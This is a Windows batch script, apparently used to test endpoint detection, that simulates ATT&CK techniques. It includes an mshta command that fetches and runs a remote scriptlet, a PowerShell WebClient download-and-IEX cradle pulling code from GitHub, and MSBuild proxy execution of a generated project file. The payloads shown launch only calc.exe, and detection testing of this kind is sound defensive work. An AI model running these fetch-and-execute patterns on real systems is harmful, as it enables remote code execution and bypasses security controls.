echo %time% %date% [+] T1170 - Testing mshtha
start "" cmd /c mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
echo Execution Finished at %time% %date%
echo Command Excuted: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Mshta_calc.sct").Exec();close();
timeout 5

echo %time% %date% [+] T1086 - Testing powershell cradle - WebClient
start "" cmd /c powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
echo Execution Finished at %time% %date%
echo Command Excuted: powershell -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
timeout 5

echo %time% %date% [+] T1127 - Testing MSBuild

echo ^<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^> > xxxFile.csproj
echo    ^<ItemGroup^>   >> xxxFile.csproj
echo         ^<Binaries Include="*.dll;*.exe"/^>   >> xxxFile.csproj
echo     ^</ItemGroup^>   >> xxxFile.csproj
echo   ^<Target Name="SetACL"^>   >> xxxFile.csproj
echo         ^<Exec Command="calc.exe"/^>   >> xxxFile.csproj
echo     ^</Target^>   >> xxxFile.csproj
echo ^</Project^>   >> xxxFile.csproj

start "" cmd /c C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj

timeout 5

